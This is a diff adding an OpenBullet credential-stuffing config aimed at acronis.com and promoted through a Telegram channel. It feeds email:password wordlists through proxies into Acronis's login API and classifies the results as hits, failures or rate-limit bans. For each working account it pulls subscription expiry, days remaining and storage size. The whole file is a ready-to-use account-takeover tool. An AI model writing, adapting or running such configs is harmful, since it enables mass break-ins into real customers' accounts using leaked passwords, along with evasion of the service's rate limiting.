@@ -1,0 +1,125 @@
+[SETTINGS]
+{
+  "Name": "acronis.com",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-25T15:25:33.2485603+03:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 2042904700
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://account.acronis.com/v2/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Host: account.acronis.com" 
+  HEADER "Sec-Ch-Ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"94\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Origin: https://account.acronis.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://account.acronis.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+    KEY "<RESPONSECODE>" EqualTo "422" 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "429" 
+
+#Get REQUEST GET "https://www.acronis.com/en-us/my/api/subscription/" 
+  
+  HEADER "Host: www.acronis.com" 
+  HEADER "Sec-Ch-Ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"94\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Origin: https://account.acronis.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://account.acronis.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"preview\":null,\"conflicted\":[]}" 
+  KEYCHAIN Success OR 
+    KEY "expiration_date\":" 
+
+#EX PARSE "<SOURCE>" LR "expiration_date\":" "," -> VAR "EX" 
+
+#expireDate FUNCTION UnixTimeToDate "<EX>" -> CAP "expireDate" 
+
+#current FUNCTION CurrentUnixTime -> VAR "current" 
+
+#compute FUNCTION Compute "(<EX>-<current>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+#S PARSE "<SOURCE>" LR "storage\":" "}" -> VAR "S" 
+
+#storage FUNCTION Translate 
+  KEY "1024" VALUE "1 TB" 
+  "<S>" -> CAP "storage" 
+
+SET CAP "Config By" "@Hogo_Victor"
+SET CAP "Telegram Channel" "https://t.me/Open_Bullet_Config"
+
